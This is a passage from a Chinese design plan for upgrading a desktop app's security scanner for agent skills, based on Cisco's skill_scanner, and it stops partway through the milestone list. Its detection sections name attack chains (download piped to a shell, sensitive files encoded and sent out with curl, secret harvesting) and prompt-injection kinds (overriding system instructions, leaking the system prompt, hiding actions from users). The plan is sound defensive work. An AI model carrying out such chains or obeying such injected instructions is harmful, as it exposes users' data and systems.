# 安全扫描器升级计划（方案一整合版）

> 对比对象：Cisco 开源 `skill_scanner`（`reference/skill_scanner`）  
> 本项目实现：`src-tauri/src/security/`  
> 约束：不引入基于 LLM 或远程 API 的安全检测逻辑；排除 `LLMAnalyzer`、`MetaAnalyzer`、`VirusTotalAnalyzer`、`AIDefenseAnalyzer` 等远程/模型模块。  
> 主线：保留现有 Rust/Tauri 扫描器，把 Cisco 的本地静态能力分阶段移植到 Rust 侧。
>
> 版本演进：v1 为初始分析（2026-06-01），v2 按方案一整合并细化里程碑（2026-06-02），v3 统一 severity 模型、拆分 P1 里程碑、补充架构决策，v4 修正迁移策略、明确 ScanMode 放置、统一内部/外部 severity 为 5 级、补充 DB 兼容方案。

---

## 1. 结论

本项目当前扫描器是轻量安装前阻断器：纯 Rust、`RegexSet` 批量匹配、扩展名过滤、硬触发阻断、目录/文件上限、UTF-16 解码、续行与字符串拼接归一化、symlink 阻断、`partial_scan` 标记。这些能力适合桌面应用和安装流程，应继续保留。

Cisco `skill_scanner` 的价值不在于“规则更多”这一点本身，而在于体系化：规则包、策略、Skill 语义解析、多分析器、管道链路分析、结构校验、可分析性评分、Finding 归一化。方案一的目标是把这些确定性的本地能力移植到 Rust，而不是把 Python 扫描器作为运行时核心引入。

推荐路线：

1. 先做规则外置化和 policy，解除 `rules.rs` 硬编码瓶颈。
2. 再补 Skill 结构扫描、Prompt Injection、资产/文档风险、Secret 脱敏。
3. 然后实现 Pipeline/Compound 链路分析，补齐“单步无害、组合有害”的攻击。
4. 最后引入可分析性评分、YARA/类 YARA 规则与字节码/Office/PDF 等深度项。

---

## 2. 当前能力与差距

### 2.1 本项目应保留的优势

- 纯 Rust，无 Python 运行时和 sidecar 依赖，适合 Tauri 桌面端发布。
- `RegexSet` 批量匹配，且按扩展名缓存 `FilteredRuleSet`。
- 支持 shell `\`、PowerShell 反引号、JS/Python 字符串拼接等归一化后扫描。
- 支持 UTF-16 LE/BE 解码，适配 Windows 脚本。
- `hard_trigger` 和 `blocked` 已与安装流程绑定。
- `confidence` 参与评分，低置信度规则不会过度扣分。
- 对 symlink、文件数量、扫描深度、单文件大小、二进制内容已有基础边界控制。

### 2.2 Cisco 本地静态核心的主要优势

- `SkillLoader` 将目录解析为 Skill 对象，包含 manifest、instruction body、files、referenced files。
- `StaticAnalyzer` 分阶段扫描 manifest、SKILL.md、scripts、references、binary、hidden files、assets、PDF/Office、homoglyph 等。
- `PipelineAnalyzer` 识别 `fetch -> execute`、`read sensitive -> encode -> network`、`find/xargs -> exec` 等链路。
- `BytecodeAnalyzer` 处理 `.pyc` 与源码一致性场景。
- `RulePack` 与 `ScanPolicy` 支持规则包、禁用规则、严重度覆盖、文件范围、文档降级、已知安装器降级。
- `Analyzability` 以 fail-closed 思路评估扫描覆盖率，而不把不可读/不可分析内容默认视为安全。
- Finding 输出支持稳定 ID、去重、策略指纹和规则共现元数据。

### 2.3 本项目当前主要缺口

| 缺口 | 影响 |
|------|------|
| 规则硬编码 | 规则更新和运营调优必须改 Rust 源码 |
| 无 policy | 无法按默认/严格/宽松或组织配置调节扫描行为 |
| 缺少 Prompt Injection 规则 | 对 Agent Skill 特有威胁覆盖不足 |
| 缺少 Skill 语义解析 | 无法检查 frontmatter、allowed-tools、引用文件、未引用脚本 |
| 缺少 Pipeline 分析 | 难发现多步组合攻击 |
| 二进制/不可读文件只标记 partial | 缺少可解释的 fail-closed 风险评分 |
| 缺少 file magic 检测 | 无法发现 `.py/.md/.json` 等扩展名伪装成可执行文件/归档文件，也无法检测 text/code 与 inert asset 之间的内容类型标签不一致（P2 交付） |
| 缺少描述质量与跨 Skill 重叠检查 | 难发现泛化描述、关键词诱导、仿冒/撞功能 Skill |
| Secret 报告未统一脱敏 | 风险报告本身可能泄露 token |
| Finding 归一化不足 | 多规则/多阶段扩展后容易产生重复告警 |

---

## 3. 目标架构

```text
src-tauri/
  resources/security/
    policies/
      default.yaml
      strict.yaml
      permissive.yaml
    packs/
      core/
        pack.yaml
        signatures/*.yaml
        yara/*.yara
  src/security/
    mod.rs
    scanner.rs              # 统一编排，保留现有公开接口
    models.rs               # 内部 Finding / SkillFile / SkillContext
    policy.rs               # ScanPolicy 子集
    rules/
      mod.rs
      loader.rs             # YAML rule pack 加载
      pattern_engine.rs     # RegexSet、exclude、multiline、归一化
      builtin_compat.rs     # 现有 PatternRule 兼容迁移期使用
    analyzers/
      static_analyzer.rs    # manifest/scripts/references/assets
      structure.rs          # strict structure 子集
      file_magic.rs         # 扩展名与内容类型一致性检查
      archive_extractor.rs  # ZIP/TAR/Office 包安全提取与扫描扩展
      pipeline.rs           # pipeline/compound 分析
      analyzability.rs      # 扫描覆盖率与 fail-closed finding
      yara.rs               # 后续可选
      bytecode.rs           # 后续可选
    adapters.rs             # Finding -> SecurityIssue/SecurityReport
```

设计原则：

- 对外保持 `SecurityScanner::scan_file`、`scan_directory_with_options`、`SecurityReport` 基本兼容。
- 内部改为多 analyzer 产出统一 `Finding`，最后由 adapter 映射到现有 UI 模型。
- 所有规则和策略默认本地内置，不调用远程服务。规则包和 policy 文件通过 `include_str!` / `include_bytes!` 编译时嵌入二进制，启动时解析。不依赖运行时文件系统路径，部署简单无外部依赖。
- 优先移植确定性检测，不移植依赖 LLM 判断的行为。
- 删除现有未使用的 `SecurityChecker` trait（`mod.rs` 中定义但 `SecurityScanner` 未实现），减少死代码。后续如需 trait 抽象再重新定义更合适的接口。
- 新增 `ScanMode` 枚举控制扫描能力分层，作为 `SkillContext` 的内置字段（不放入 `ScanOptions`）：`SingleFile`（`scan_file` 使用）只运行内容级规则；`Directory`（`scan_directory_with_options` 使用）运行结构、引用、压缩包、pipeline、analyzability 等需要完整上下文的 analyzer。各 analyzer 通过 `SkillContext.scan_mode` 决定是否跳过，避免在 analyzer 内部零散判断 context 完整性。`ScanOptions` 保留 `skip_readme` 等运行时选项，不与 `ScanMode` 合并——`ScanMode` 描述"扫描对象的完整度"，`ScanOptions` 描述"用户/调用方的偏好"。

---

## 4. 核心模块计划

### 4.1 规则包与 Policy

新增 Rust 侧 `ScanPolicy`，先覆盖以下字段：

- `disabled_rules`
- `severity_overrides`
- `hard_trigger_overrides`
- `file_limits.max_files`
- `file_limits.max_depth`
- `file_limits.max_scan_file_size_bytes`
- `file_classification.inert_extensions`
- `rule_scoping.doc_path_indicators`
- `rule_scoping.skip_in_docs`
- `pipeline.known_installer_domains`
- `credentials.known_test_values`
- `finding_output.dedupe`
- `archive.max_depth`
- `archive.max_total_size_bytes`
- `archive.max_file_count`
- `archive.max_compression_ratio`
- `strict_structure.allowed_extensions`
- `strict_structure.allowed_subdirs`
- `trigger.min_description_length`
- `trigger.keyword_baiting_threshold`

规则 YAML 支持：

- `id`
- `category`（使用 `ThreatCategory` 枚举值）
- `severity`（5 级：`Critical` / `High` / `Medium` / `Low` / `Info`）
- `weight`
- `confidence`
- `hard_trigger`
- `patterns`
- `exclude_patterns`
- `file_types`（可选，省略表示匹配全部文件类型）
- `suppress_if_matched`（可选，规则 ID 列表，同行命中时抑制当前规则）
- `description`
- `remediation`
- `cwe_id`
- `metadata`

迁移策略：

1. 保留现有 `rules.rs`，作为兼容基线。
2. 新建 YAML rule pack，并先复制现有 84 条规则到 YAML。迁移时将现有 severity 按映射表转换为新的 5 级（详见 4.11 节 severity 统一方案）。
3. 现有 84 条规则的扩展名过滤逻辑由 `scanner.rs` 中 `rule_applies_to_extension` 硬编码实现（约 100 行 match 语句）。迁移时**必须**将该逻辑同步到 YAML `file_types` 字段，不能留空。留空会导致所有规则匹配所有文件，产生大量误报（如 Python 规则扫描 `.sh` 文件）。具体做法：为每条规则从 `rule_applies_to_extension` 提取对应的扩展名列表，写入 `file_types`；通用规则（match all）显式省略 `file_types` 字段表示匹配全部。同时在 YAML 中新增可选 `suppress_if_matched` 字段，用于表达规则间互斥关系（如 `CURL_PIPE_SH_MENTION` 在同一行命中 `CURL_PIPE_SH` 时被抑制），取代当前 `scanner.rs` 中的硬编码抑制逻辑。
4. 增加 Cisco core signatures 中本项目缺失的 Agent Skill 规则。
5. 验证一致后逐步瘦身 `rules.rs`。
6. YAML 规则文件通过 `include_str!` 编译时嵌入二进制，启动时解析为 Rust 结构体。不依赖运行时文件系统路径。

### 4.2 Pattern Engine

在现有 `RegexSet` 基础上增强：

- 支持一条规则多个 pattern。
- 支持 `exclude_patterns`，先排除再命中。
- 支持 `file_types` 和文档目录降级。
- 保留现有续行、字符串拼接、UTF-16 处理。
- 支持多行 pattern 第二遍扫描，覆盖 `path = ...\nopen(path)` 类模式。
- 为每个 finding 生成稳定 ID：`rule_id + file + line + snippet_hash`。
- 保留现有 `SKILL.md` 特殊处理：任意大小写的 `SKILL.md` 仍运行全规则扫描，不只按 `.md` file type 过滤。
- 保留现有 `CURL_PIPE_SH` 与 `CURL_PIPE_SH_MENTION` 同行抑制逻辑。迁移方案：在 YAML 规则中为 `CURL_PIPE_SH_MENTION` 增加 `suppress_if_matched: [“CURL_PIPE_SH”]` 字段，pattern_engine 层通用实现”同行互斥”语义，取代当前 `scanner.rs` 中的硬编码 if 判断。后续其他规则如需类似互斥关系，可复用同一字段。

参考 Cisco：

- `reference/skill_scanner/core/rules/patterns.py`
- `reference/skill_scanner/data/packs/core/signatures/`

### 4.3 Skill 语义与结构扫描

新增 `SkillContext`：

- `skill_dir`
- `skill_md_path`
- `manifest`
- `instruction_body`
- `files`
- `referenced_files`
- `script_files`
- `asset_files`
- `reference_files`
- `scan_mode`: `ScanMode` 枚举，取值 `SingleFile` 或 `Directory`。`scan_file` 构建的 `SkillContext` 使用 `SingleFile`，仅 SKILL.md 内容可用，`skill_dir`/`files`/`referenced_files` 等字段为 `None` 或空；`scan_directory_with_options` 构建的 `SkillContext` 使用 `Directory`，所有字段完整填充。各 analyzer 入口首先检查 `scan_mode`：`SingleFile` 模式下跳过需要目录上下文的检查（结构扫描、orphan scripts、引用文件完整性、archive extraction、pipeline、analyzability），只运行内容级规则（正则匹配、Prompt Injection 文本检测、Secret 检测）。

扫描项：

- `SKILL.md` 是否存在，frontmatter 是否可解析。
- `name` 格式、长度、目录名一致性。
- `description` 是否为空、过短、过长、过泛。
- `allowed-tools` 与实际行为是否明显不一致。
- symlink、隐藏文件、隐藏可执行脚本、非规范扩展名。
- `SKILL.md` 中引用路径是否路径穿越、是否过深、是否不存在。
- 目录中存在未引用脚本时给出低/中风险 finding。
- `allowed-tools` 检查只做确定性分项：Read、Write、Bash、Grep、Glob、Network。不要把“存在 Python helper 脚本”直接判为违规；只有代码实际读写文件、执行 shell、搜索/遍历文件或发起网络请求时才告警。

引用文件提取要覆盖：

- Markdown 链接：`[text](file.md)`，排除 URL、锚点、绝对路径和路径穿越。
- 自然语言引用：`see` / `refer to` / `check` / `read` 加反引号或引号包裹的文件路径。
- 执行型引用：`run` / `execute` / `invoke` 加 `scripts/foo.py`、`scripts/foo.sh`。
- `@reference: path/to/file` 指令。
- `include:` / `import:` / `load:` 指令。
- Python import 语句推断本地模块，需区分 stdlib、常见第三方依赖和本地 `.py` 文件。
- `references/`、`assets/`、`templates/` 路径引用。

`allowed-tools` 各分项检测模式：

- Read：`open(..., "r")`、`.read()`、`Path(...).read_text/read_bytes`、`with open(..., "r")`。
- Write：`open(..., "w")`、`.write()`、`.writelines()`、`Path(...).write_*`、`with open(..., "w")`。
- Bash：`subprocess.run/call/Popen/check_output`、`os.system`、`os.popen`、`commands.getoutput`、`shell=True`，以及包内 bash/sh 文件。
- Grep：`re.search/findall/match/finditer/sub`、`grep`。
- Glob：`glob.glob/iglob`、`Path.glob/rglob`、`fnmatch`。
- Network：`requests.*`、`urllib.*`、`http.client`、`httpx.*`、`aiohttp.*`、`socket.connect/create_connection`；后续实现应排除明确 localhost-only 用法，减少开发/测试辅助代码误报。

结构校验采用白名单模式：

- 对标 `strict_structure.py` 的 `ValidationErrorCode`，覆盖 symlink、hidden file、disallowed directory、disallowed extension、binary content、non-UTF-8、missing SKILL.md、frontmatter parse error、missing required field、name format/length/dir mismatch、description empty/too long、compatibility too long。
- 顶层子目录优先只允许 `scripts`、`references`、`assets`，可通过 policy 扩展。
- 文件扩展名优先只允许 `.md`、`.py`、`.sh`、`.json`、`.yaml`、`.txt`、`.js`、`.ts`、`.html`、`.css`、`.svg`、`.xml`、`.xsd`，可通过 policy 扩展。
- 文本文件必须为 UTF-8 且不含 NUL 字节；二进制或非 UTF-8 内容进入结构/可分析性 finding。

一致性与描述质量检查：

- `TOOL_ABUSE_UNDECLARED_NETWORK`：代码使用网络库，但 manifest/compatibility/description 未声明网络行为。
- `SOCIAL_ENG_MISLEADING_DESC`：description 表示 calculator/formatter 等简单功能，但代码实际使用网络或高风险能力。
- `TRIGGER_OVERLY_GENERIC`：描述过泛，容易抢占触发。
- `TRIGGER_DESCRIPTION_TOO_SHORT` / `TRIGGER_VAGUE_DESCRIPTION`：描述太短或泛化词占比过高、具体词不足。
- `TRIGGER_KEYWORD_BAITING`：逗号分隔关键词过多，疑似诱导触发。

参考 Cisco：

- `reference/skill_scanner/core/loader.py`
- `reference/skill_scanner/core/strict_structure.py`
- `reference/skill_scanner/data/packs/core/python/allowed_tools_checks.py`
- `reference/skill_scanner/data/packs/core/python/consistency_checks.py`
- `reference/skill_scanner/data/packs/core/python/trigger_checks.py`
- `reference/skill_scanner/data/packs/core/python/manifest_checks.py`

### 4.4 Prompt Injection 与 Agent 威胁规则

优先移植 Cisco `prompt_injection.yaml` 和 core pack 中 Agent Skill 相关规则：

- 忽略/覆盖系统指令。
- 进入 unrestricted/debug/admin 等模式。
- 绕过安全策略。
- 要求泄露 system prompt。
- 要求隐藏动作或不要告知用户。
- capability inflation。
- tool chaining abuse。
- autonomy abuse。
- assets/references/data 目录中的 prompt injection 文本、角色重绑定和可疑 URL。

阻断建议：

- 对明确“覆盖系统/隐藏行为/绕过策略”的 `SKILL.md` 指令，默认 `High` 或 `Critical`，并进入 `blocked`。
- 对 references/examples/docs 中的同类文本按 policy 降级，避免教育性文档误报。

阶段边界：

- P1 只追求 regex/signature 级 Prompt Injection 覆盖，重点是 `SKILL.md`、Markdown、assets/references 中的显式覆盖、绕过、隐藏、泄露 system prompt 指令。
- `indirect prompt injection`、`unicode steganography`、更复杂的同形字/隐写规则依赖 YARA 或专门静态检查，放到 P4，不作为 P1 验收条件。

参考 Cisco：

- `reference/skill_scanner/data/packs/core/signatures/prompt_injection.yaml`
- `reference/skill_scanner/data/packs/core/python/asset_checks.py`
- `reference/skill_scanner/data/packs/core/yara/indirect_prompt_injection_generic.yara`
- `reference/skill_scanner/data/packs/core/yara/prompt_injection_unicode_steganography.yara`

### 4.5 Archive 与复合文档提取

Cisco 在主扫描编排前会先执行 archive extraction，将压缩包和 Office Open XML 这类复合文档安全展开后再交给 analyzer。Rust 侧需要把这个能力作为独立模块，而不是只在 pipeline 中识别“解压后执行”的命令文本。

支持范围：

- ZIP 系列：`.zip`、`.jar`、`.war`、`.apk`。
- TAR 系列：`.tar`、`.tar.gz`、`.tgz`、`.tar.bz2`、`.tar.xz`。
- Office/OpenDocument：`.docx`、`.xlsx`、`.pptx`、`.odt`、`.ods`、`.odp`。

安全限制：

- 最大嵌套深度。
- 最大解压总大小。
- 最大解压文件数。
- 最大压缩比，超过阈值产生 `ARCHIVE_ZIP_BOMB`。
- 禁止解压路径穿越，产生 `ARCHIVE_PATH_TRAVERSAL`。
- 禁止 archive entry symlink，产生高风险 finding。
- 解压目录使用临时目录，扫描结束必须清理。

输出行为：

- 解压出的文本/脚本文件加入 `SkillContext.files`，参与后续规则、结构、pipeline、analyzability 扫描。
- 解压失败产生 `ARCHIVE_EXTRACTION_FAILED`，不静默跳过。
- 嵌套过深产生 `ARCHIVE_NESTED_TOO_DEEP`。
- Office/PDF 深度结构风险仍放在 P4，但 archive extraction 要先为后续能力预留文件来源和 metadata。
- 解压 Office 文档（`.docx`/`.xlsx`/`.pptx`）时检查 ZIP 文件名列表中是否存在 `vbaProject`（VBA 宏）或 `oleObject`/`embeddings`（嵌入 OLE 对象），产生 `OFFICE_VBA_MACRO`（CRITICAL）和 `OFFICE_EMBEDDED_OLE`（HIGH）。此检查仅遍历 ZIP entry 名称，不依赖外部库，成本极低。

参考 Cisco：

- `reference/skill_scanner/core/extractors/content_extractor.py`

### 4.6 Pipeline 与 Compound 分析

实现独立 `pipeline.rs`，不依赖 LLM。

优先覆盖：

- `curl/wget/iwr -> sh/bash/IEX`
- `download -> chmod +x -> execute`
- `archive extract -> execute`
- `cat/read sensitive file -> base64/xxd/openssl -> curl/post`
- `find -exec`、`find | xargs sh/bash/eval`
- `env/secret harvesting -> network send`
- `base64 decode -> execute`

误报控制：

- 已知安装器域名降级，如 `bun.sh`、`get.pnpm.io`、`sh.rustup.rs`。
- 文档目录和示例代码降级。
- API 文档型 `curl | jq` 不作为执行链。
- 同一 pipeline 多入口命中时去重。

参考 Cisco：

- `reference/skill_scanner/core/analyzers/pipeline_analyzer.py`

### 4.7 File Magic 与扩展名一致性

当前 Rust 扫描器主要通过 NUL byte 判断二进制，无法识别“扩展名看似源码/文本，实际内容是可执行文件、归档或其他高风险格式”的伪装。Rust 侧先实现不依赖 Magika 的 magic byte fallback，后续如有稳定本地模型/库再扩展。

检测目标：

- `.py`、`.js`、`.ts`、`.md`、`.json`、`.yaml` 等 text/code 扩展名，实际为 PE、ELF、Mach-O、脚本 shebang 不匹配、ZIP/TAR、PDF/Office 等。
- `.png/.jpg/.webp` 等 inert asset 扩展名，实际为脚本、HTML/SVG 脚本或可执行文件。
- `.py` 实际为 shell、`.json` 实际为 HTML/SVG 等 label-level mismatch。

严重度建议：

- text/code 扩展名实际为 executable：`CRITICAL`。
- text/code 扩展名实际为 archive/compound document：`HIGH`。
- text/code 内部语言标签不一致：`MEDIUM`，并允许 shebang 兼容扩展名降级。
- inert asset 实际为脚本/HTML/SVG 可执行内容：`HIGH`。

参考 Cisco：

- `reference/skill_scanner/core/file_magic.py`
- `reference/skill_scanner/data/packs/core/python/binary_file_checks.py`

### 4.8 Analyzability

新增可分析性评分，不替代现有安全分，而是作为补充维度：

- 文本源码、Markdown、JSON/YAML、shell、Python、JS/TS 视为可分析。
- 静态图片、字体等 inert assets 可视为低风险可跳过。
- 未知二进制、超大截断、不可读文件、`.pyc` 无源码视为不可完全分析。
- 按文件大小 log 权重计算覆盖率。
- 低于阈值时产生 `LOW_ANALYZABILITY`。
- 不可分析高风险文件产生 `UNANALYZABLE_BINARY`。

与现有字段关系：

- `partial_scan = true` 继续保留。
- `skipped_files` 继续记录。
- 新增 finding 解释为什么 partial，避免 UI 只显示一个布尔值。
- 文件数量超过 policy `max_file_count` 时产生 `EXCESSIVE_FILE_COUNT`（LOW），metadata 包含 `file_count` 和 `type_breakdown`。
- 单文件超过 policy `max_file_size_bytes` 时产生 `OVERSIZED_FILE`（LOW），metadata 包含文件路径和实际大小。
- 这两个 finding 让 `partial_scan = true` 的原因可解释，而非仅依赖布尔值和 `skipped_files` 列表。

参考 Cisco：

- `reference/skill_scanner/core/analyzability.py`
- `reference/skill_scanner/data/packs/core/python/analyzability_checks.py`

### 4.9 现有流程融合

必须明确兼容当前安装和扫描流程：

- `download_and_analyze` 当前只下载并扫描远端 `SKILL.md`。增强后通过 `ScanMode::SingleFile` 运行：只执行内容级规则（正则、Prompt Injection 文本、Secret），不运行结构扫描、引用文件完整性、orphan scripts、archive extraction、pipeline、analyzability。不会因缺少目录上下文产生 `MISSING_SKILL_MD`、引用缺失等误报。**该扫描结果仅用于快速预检**：如果 SingleFile 阶段就命中 `hard_trigger`，可短路返回避免不必要的仓库下载；否则结果不写入 DB，不作为最终报告。`download_and_analyze` 的返回值语义调整为"预检报告 + 下载内容"，`apply_scan_report` 仅在预检阻断时调用。
- `prepare_skill_installation` 的完整流程为：① `download_and_analyze` 预检 → ② 下载仓库缓存 → ③ `scan_directory_with_options`（`ScanMode::Directory`）生成最终报告 → ④ `apply_scan_report` 写入 DB → ⑤ `enforce_installable_report` 阻断判断。最终报告以 Directory 扫描为准，SingleFile 预检结果不合并。
- `rescan_skill_directory_for_confirmation` 使用 `ScanOptions { skip_readme: true }`，增强后仍要遵守 `skip_readme`，避免 README/README.zh.md 重复触发文档类告警。`skip_readme` 保留在 `ScanOptions` 中，不迁移到 `ScanPolicy`——它是调用方的运行时偏好，不是全局策略配置。
- `enforce_installable_report` 依赖 `blocked`、`hard_trigger_issues`、`partial_scan`、`skipped_files`。adapter 必须继续填充这些字段，不能只输出内部 `Finding`。
- `count_scan_files` 和进度回调 `on_file_scanned` 需要继续可用。若 archive extraction 会增加扫描文件，进度估算可以先保持基于原始目录文件，报告中通过 metadata 标明 extracted files。
- 数据库和前端目前保存 `security_score`、`security_level`、`security_issues`、`security_report`。新增字段应优先放在 `SecurityIssue` 可选字段或 report metadata 中，旧 UI 不识别也不能破坏反序列化。

### 4.10 Secret 脱敏

所有 secret 类 finding 的 `code_snippet` 必须脱敏：

- AWS/GitHub/Stripe/OpenAI/JWT/DB URL 保留前缀和类型。
- 私钥只保留 `BEGIN ... PRIVATE KEY` 类型说明。
- 通用 token 保留前 4 位或固定前缀。
- 原始完整 secret 不进入日志、数据库和 UI。

参考 Cisco：

- `reference/skill_scanner/core/analyzers/static.py` 中 `_redact_secret`

### 4.11 Finding 归一化与报告

内部新增 `Finding`，字段建议：

- `id`
- `rule_id`
- `category`：使用统一的 `ThreatCategory` 枚举（见下文分类体系）
- `severity`：5 级 `Severity` 枚举（见下文 severity 统一方案）
- `title`
- `description`
- `file_path`
- `line_number`
- `snippet`
- `remediation`
- `analyzer`
- `metadata`

输出时：

- 按 `rule_id + file + line + normalized_snippet` 去重。
- 同一位置多个 analyzer 命中时保留更高严重度。
- 同路径多规则共现写入 `metadata.same_path_other_rule_ids`。
- policy fingerprint 写入报告 metadata，便于追溯规则版本。
- 通过 adapter 映射回现有 `SecurityIssue`，前端可逐步扩展展示。
- report metadata 保留 `analyzer`、`rule_source`、`policy_fingerprint`、`same_path_other_rule_ids`，旧 UI 可忽略。

#### 4.11.1 Severity 统一方案

**现状**：代码中存在两层 severity 枚举：
- 内部 `Severity`（`rules.rs`）：`Low / Medium / High / Critical`（4 级）
- 对外 `IssueSeverity`（`models/security.rs`）：`Info / Warning / Error / Critical`（4 级）
- 通过 `map_severity` 函数映射：`Critical→Critical`、`High→Error`、`Medium→Warning`、`Low→Info`

**目标**：统一为 5 级 `Critical / High / Medium / Low / Info`，内外一致，消除 `map_severity` 中间层。

**具体变更**：
1. `IssueSeverity` 枚举从 `{Info, Warning, Error, Critical}` 改为 `{Critical, High, Medium, Low, Info}`。
2. 内部 `Severity` 枚举从 `{Low, Medium, High, Critical}` 改为 `{Critical, High, Medium, Low, Info}`，与 `IssueSeverity` 一一对应。
3. 删除 `map_severity` 函数，analyzer 直接产出 `IssueSeverity`（或内部 `Severity` 直接就是 `IssueSeverity` 的别名）。
4. **DB 向后兼容**：为 `IssueSeverity` 的 serde 反序列化添加别名——`High` 同时接受旧值 `Error`，`Medium` 同时接受旧值 `Warning`，`Low` 同时接受旧值 `Info`。写出统一使用新值。实现方式：`#[serde(alias = "Error")]` 加在 `High` 变体上，其余类似。零迁移成本，旧数据可直接读取。
5. `SecurityLevel` 区间保持不变（`Safe` 90-100, `Low` 70-89, `Medium` 50-69, `High` 30-49, `Critical` 0-29）。
6. 前端展示标签需同步更新：`Error` → `High`，`Warning` → `Medium`。

**84 条规则迁移映射**（基于当前 `Severity` 枚举值）：

| 当前 `Severity` | 当前 `IssueSeverity`（经 map） | 新 `IssueSeverity` |
|---|---|---|
| `Critical` | `Critical` | `Critical`（不变） |
| `High` | `Error` | `High` |
| `Medium` | `Warning` | `Medium` |
| `Low` | `Info` | `Low` |

注：当前内部 `Severity` 没有 `Info` 级别，84 条规则最低为 `Low`。新增的纯信息性 finding（如 `EXCESSIVE_FILE_COUNT`、`OVERSIZED_FILE`）使用 `Info` 级别。

#### 4.11.2 分类体系统一方案

**现状**：
- 内部 `Category`（`rules.rs`）：`Destructive / RemoteExec / CmdInjection / Network / Privilege / Secrets / Persistence / SensitiveFileAccess`（8 个），通过 `map_category` 映射到对外 `IssueCategory`（7 个）。
- Cisco 体系使用 `ThreatCategory`：prompt / social / policy / command / data exfiltration / resource abuse 等。

**目标**：`Finding` 使用统一的 `ThreatCategory` 枚举，覆盖 Cisco 语义和现有分类。

**`ThreatCategory` 候选值**（12 个）：

| ThreatCategory | 说明 | 对应现有 Category | 对应现有 IssueCategory |
|---|---|---|---|
| `Destructive` | 破坏性操作 | `Destructive` | `FileSystem` |
| `RemoteExec` | 远程下载执行 | `RemoteExec` | `ProcessExecution` |
| `CmdInjection` | 命令注入 | `CmdInjection` | `DangerousFunction` |
| `Network` | 网络外传 | `Network` | `Network` |
| `PrivilegeEscalation` | 权限提升 | `Privilege` | `Other` |
| `Secrets` | 凭据/密钥泄露 | `Secrets` | `DataExfiltration` |
| `Persistence` | 持久化 | `Persistence` | `Other` |
| `SensitiveFileAccess` | 敏感文件访问 | `SensitiveFileAccess` | `FileSystem` |
| `PromptInjection` | Prompt 注入/指令覆盖 | （新增） | `Other` |
| `SocialEngineering` | 社会工程/误导描述 | （新增） | `Other` |
| `PolicyViolation` | 策略违规（allowed-tools 等） | （新增） | `Other` |
| `Obfuscation` | 混淆/伪装/隐写 | （新增） | `ObfuscatedCode` |

**adapter 映射**：`Finding.threat_category` → `SecurityIssue.category`（`IssueCategory`）按上表第三列映射。同时在 `SecurityIssue.metadata` 中保留原始 `threat_category` 字符串，前端可逐步扩展展示。若前端可扩展，优先新增 `threat_category` 可选字段保留完整语义。

参考 Cisco：

- `reference/skill_scanner/core/models.py`
- `reference/skill_scanner/core/scanner.py`

### 4.12 跨 Skill 分析（可选）

跨 Skill 描述重叠不是单个 skill 安装阻断的必需能力，但适合 Overview/批量扫描场景，用于发现仿冒、功能撞车、触发抢占风险。

候选能力：

- 对已安装或待扫描的一组 Skill 计算 description Jaccard 相似度。
- 相似度高于阈值时输出 `TRIGGER_OVERLAP_RISK`。
- 相似度中等时输出 `TRIGGER_OVERLAP_WARNING`。
- 不参与单个 skill 安装硬阻断，优先作为批量扫描告警。

参考 Cisco：

- `reference/skill_scanner/core/scanner.py` 中 `_check_description_overlap`

---

## 5. 分阶段里程碑

### P0：规则外置化与兼容基线

目标：不改变现有扫描结果的前提下，建立可扩展规则体系。

交付：

- `policy.rs`
- YAML rule loader
- `pattern_engine.rs`
- 默认 `default.yaml`
- 现有 84 条 Rust 规则迁移到 YAML
- 现有单元测试全部通过

验收：

- 对现有测试样例，YAML 规则结果与旧 `rules.rs` 等价。
- `hard_trigger`、`confidence`、`remediation`、`cwe_id` 不丢失。
- `file_types` 从 `rule_applies_to_extension` 逐条迁移，非空 `file_types` 的规则行为与原 match 语句一致。
- `suppress_if_matched` 字段生效，`CURL_PIPE_SH_MENTION` 在 `CURL_PIPE_SH` 同行命中时被抑制。
- 禁用规则和严重度覆盖可生效。
- 迁移期保持当前 `calculate_score_weighted` 算法不变；规则 YAML 只提供 `weight/confidence/hard_trigger` 元数据，不在 P0 替换评分模型。
- `SKILL.md` 全规则扫描逻辑保留。
- `IssueSeverity` 枚举完成 4 级到 5 级迁移，serde alias 兼容旧值。

### P1a：SkillContext 构建、结构扫描与流程兼容

目标：建立 Skill 语义解析基础，补齐结构扫描能力，确保现有流程不退化。

交付：

- `SkillContext` 构建（含 `ScanMode` 枚举：`SingleFile` / `Directory`）
- frontmatter 解析
- strict structure 白名单校验（允许子目录、允许扩展名、UTF-8、NUL/binary、frontmatter、name/description/compatibility）
- referenced files 提取（Markdown 链接、自然语言引用、执行型引用、`@reference:`、`include/import/load:`、Python import、assets/references/templates 路径，区分 stdlib/第三方与本地模块）
- hidden files / orphan scripts finding
- Secret 脱敏
- 单文件扫描与目录扫描能力分层（`ScanMode` 控制 analyzer 运行范围）

验收：

- `scan_file(SKILL.md)` 以 `ScanMode::SingleFile` 运行，不因缺少目录上下文产生 `MISSING_SKILL_MD`、引用缺失、orphan scripts 等结构类误报。
- `scan_directory_with_options` 以 `ScanMode::Directory` 运行，结构扫描覆盖全部白名单校验项。
- 引用文件提取覆盖所有指定模式，且能区分 stdlib/第三方与本地模块。
- strict structure 校验覆盖允许子目录、允许扩展名、UTF-8、NUL/binary、frontmatter、name/description/compatibility。
- 报告不泄露完整 secret。
- 现有 `enforce_installable_report` 依赖字段（`blocked`、`hard_trigger_issues`、`partial_scan`、`skipped_files`）继续正确填充。

### P1b：Prompt Injection、Allowed-tools 与行为一致性检查

目标：补齐 Agent Skill 特有威胁面，检测 Skill 声明与实际行为的不一致。

交付：

- Prompt Injection 规则包（regex/signature 级，覆盖 `SKILL.md`、Markdown、assets/references 中的 override/bypass/conceal/system prompt reveal）
- allowed-tools 基础一致性检查（Read/Write/Bash/Grep/Glob/Network 分项，按实际行为告警）
- manifest compatibility 与代码行为一致性检查（`TOOL_ABUSE_UNDECLARED_NETWORK`、`SOCIAL_ENG_MISLEADING_DESC`）
- description 质量/关键词诱导检查（`TRIGGER_OVERLY_GENERIC`、`TRIGGER_DESCRIPTION_TOO_SHORT`、`TRIGGER_VAGUE_DESCRIPTION`、`TRIGGER_KEYWORD_BAITING`）
- assets/references/data prompt injection 扫描

验收：

- 恶意 `SKILL.md` 中的 override/bypass/conceal 指令可阻断。
- references/docs 中的教育性文本按 policy 降级。
- Read/Write/Bash/Grep/Glob/Network allowed-tools 分项能按实际行为告警，Python helper 脚本存在本身不告警。
- 使用网络但未声明、简单描述却执行网络/高风险行为、描述过泛/过短/关键词诱导能产生对应 finding。

### P2：Archive 提取、File Magic、Pipeline 与组合攻击分析

目标：发现单条正则难覆盖的链路风险。

交付：
